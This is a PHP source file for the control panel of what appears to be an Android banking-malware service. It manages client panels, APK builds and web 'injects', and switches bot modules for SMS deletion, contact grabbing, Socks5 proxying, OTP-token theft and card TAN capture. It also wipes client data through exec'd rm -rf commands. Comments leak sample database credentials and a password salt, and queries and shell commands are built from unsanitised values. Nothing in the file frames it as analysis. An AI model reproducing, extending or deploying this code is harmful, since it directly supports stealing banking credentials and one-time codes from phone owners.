<?php
include("lib.php");
include("config.php");
include("pdo.php");

$clients = array(); # 'user1', 'user2'
$res = scandir("../../clients/");
foreach($res as $cl)
	if($cl != '..' && $cl != 'blank' && file_exists("../../clients/{$cl}/bot/"))
		$clients[] = $cl;
		
$clients_options = array();
foreach($clients as $cl)
{
	$config_file = glob("../../clients/{$cl}/bot/config_*.php")[0];
	$out = array();
	exec("php config_loader.php {$config_file}", $out);
	$options = array();
	foreach($out as $opt)
	{
		if(!strstr($opt, ":"))
			continue;
			
		list($name, $val) = explode(":", $opt);
		$options[$name] = $val;
	}
	
	$clients_options[$cl] = $options;
}

//~ print_r($clients_options);
    //~ [panel2] => Array
        //~ (
            //~ [UID] => 1
            //~ [DB_NAME] => bot_panel2
            //~ [DB_MAIN] => general
            //~ [DB_USER] => root
            //~ [DB_PASS] => mysqlrootpass
            //~ [PASSWORD_MD5_SALT] => ziXv9PzHTvbKCFRHe%
            //~ [GUEST_URL] => KFVo0Ki4BZ6uxMRvKePW  -- stats folder
            //~ [CLIENT] => TestUser -- readable name
        //~ )


foreach($clients_options as $client=>$options)
{
	$db = new Db();
	$db->connect($options['DB_NAME'], $options['DB_USER'], $options['DB_PASS']);
	
	if(isset($_POST['subaction']) && isset($_POST['uid']) && $_POST['uid'] == $options['UID'])
	{
		$sub = $_POST['subaction'];
		// update config or remove client
		
		if($sub == 'Delete')
		{
			$db_root = new Db();
			$db_root->connect('general', $_DB['user'], $_DB['password']);
			
			$db_root->exec("drop database {$options['DB_NAME']}");
			$db_root->exec("drop user {$options['DB_USER']}");
			
			$cmd = "rm -f ../../apks/{$client}_*.apk";
			exec($cmd);

			$cmd = "rm -rf ../../clients/{$client}";
			exec($cmd);

			$cmd = "rm -f ../../bot/{$client}";
			exec($cmd);
			
			//~ echo html_msg("User #{$_POST['uid']} {$client} deleted");
			continue;
		}else{
			
			//~ echo html_msg("Settings for #{$_POST['uid']} {$client} saved");
			// insert or update into config
			
			$name = 'mod_cardtan';
			$val = (isset($_POST[$name]) && $_POST[$name] == 'on')? 1 : 0;
			$db->exec("insert into config values (null, '{$name}', {$val}) on duplicate key update value={$val}");

			$name = 'mod_socks';
			$val = (isset($_POST[$name]) && $_POST[$name] == 'on')? 1 : 0;
			$db->exec("insert into config values (null, '{$name}', {$val}) on duplicate key update value={$val}");

			$name = 'mod_otp_tokens';
			$val = (isset($_POST[$name]) && $_POST[$name] == 'on')? 1 : 0;
			$db->exec("insert into config values (null, '{$name}', {$val}) on duplicate key update value={$val}");

			$name = 'mod_sms_deleter';
			$val = (isset($_POST[$name]) && $_POST[$name] == 'on')? 1 : 0;
			$db->exec("insert into config values (null, '{$name}', {$val}) on duplicate key update value={$val}");

			$name = 'mod_contacts';
			$val = (isset($_POST[$name]) && $_POST[$name] == 'on')? 1 : 0;
			$db->exec("insert into config values (null, '{$name}', {$val}) on duplicate key update value={$val}");

			$name = 'mod_light';
			$val = (isset($_POST[$name]) && $_POST[$name] == 'on')? 1 : 0;
			$db->exec("insert into config values (null, '{$name}', {$val}) on duplicate key update value={$val}");
		}
		
	}
	
	$res = $db->exec("select * from config where name like('mod_%')", null, true, PDO::FETCH_ASSOC);
	$config = array();
	foreach($res as $row)
		$config[$row['name']] = $row['value'];
	
	//~ print_r($config);
	//~ [mod_cardtan] => 1
    //~ [mod_contacts] => 0
    //~ [mod_otp_tokens] => 1
    //~ [mod_sms_deleter] => 0
    //~ [mod_socks] => 1
	
	$mod_cardtan = (isset($config['mod_cardtan']) && $config['mod_cardtan'] == 1)? " checked " : "";
	$mod_contacts = (isset($config['mod_contacts']) && $config['mod_contacts'] == 1)? " checked " : "";
	$mod_otp_tokens = (isset($config['mod_otp_tokens']) && $config['mod_otp_tokens'] == 1)? " checked " : "";
	$mod_sms_deleter = (isset($config['mod_sms_deleter']) && $config['mod_sms_deleter'] == 1)? " checked " : "";
	$mod_socks = (isset($config['mod_socks']) && $config['mod_socks'] == 1)? " checked " : "";
	$mod_light = (isset($config['mod_light']) && $config['mod_light'] == 1)? " checked " : "";

	
	$user_groups = '';
	$sql = "select title from {$options['DB_MAIN']}.groups where id in(
	select group_id from {$options['DB_MAIN']}.injects where id in (
	select inject_id from {$options['DB_NAME']}.injects
	) group by group_id) group by title;";
	$data = $db->exec($sql, null, true);
	if(sizeof($data))
		foreach($data as $elem)
			$user_groups .= "{$elem['title']}, ";
			
	if($user_groups)
		$user_groups = substr($user_groups, 0, strlen($user_groups)-2);
	
	echo <<<PHP
	<form method='post'>
	<input type='hidden' name='uid' value='{$options['UID']}' />
	  <div class="box grid_3">
		<div class="box-head"><h2>#{$options['UID']} {$options['CLIENT']} <small style='color: grey'>{$client}</small> 
		<span style='float: right; font-weight: normal'>{$user_groups}</span>
		</h2>
		
		</div>
		<div class="box-content">
			
			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>Injects</p>
				<div class="form-item"><a href='?action=injects&subaction=edit&client={$options['UID']}&folder={$client}'>Edit injects</a></div>
			</div>

			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>Light mode</p>
				<div class="form-item"><input {$mod_light} name='mod_light' type='checkbox' class="iphone-check" /></div>
			</div>
			
			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>SMS Deleter</p>
				<div class="form-item"><input {$mod_sms_deleter} name='mod_sms_deleter' type='checkbox' class="iphone-check" /></div>
			</div>
			
			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>Contacts&nbsp;grabber</p>
				<div class="form-item"><input {$mod_contacts} name='mod_contacts' type='checkbox' class="iphone-check" /></div>
			</div>
			
			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>Socks5</p>
				<div class="form-item"><input {$mod_socks} name='mod_socks' type='checkbox' class="iphone-check" /></div>
			</div>
			
			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>Tokens</p>
				<div class="form-item"><input {$mod_otp_tokens} name='mod_otp_tokens' type='checkbox' class="iphone-check" /></div>
			</div>
			
			<div class="form-row">
				<p class="form-label" style='font-size: 100%'>Coordinates</p>
				<div class="form-item"><input {$mod_cardtan} name='mod_cardtan' type='checkbox' class="iphone-check" /></div>
			</div>

			<div class="form-row">
				<input type="submit" name='subaction' value="Save" class="button blue" style='float: right' />
				<input type="submit" name='subaction' onclick='return confirm("Are you sure? It will delete clients database and panel files physically. Action can not be reverted")' value="Delete" class="button red"  />
			</div>

		  <div class="clear"></div>
		</div>
	  </div>
	 </form>
PHP;
}

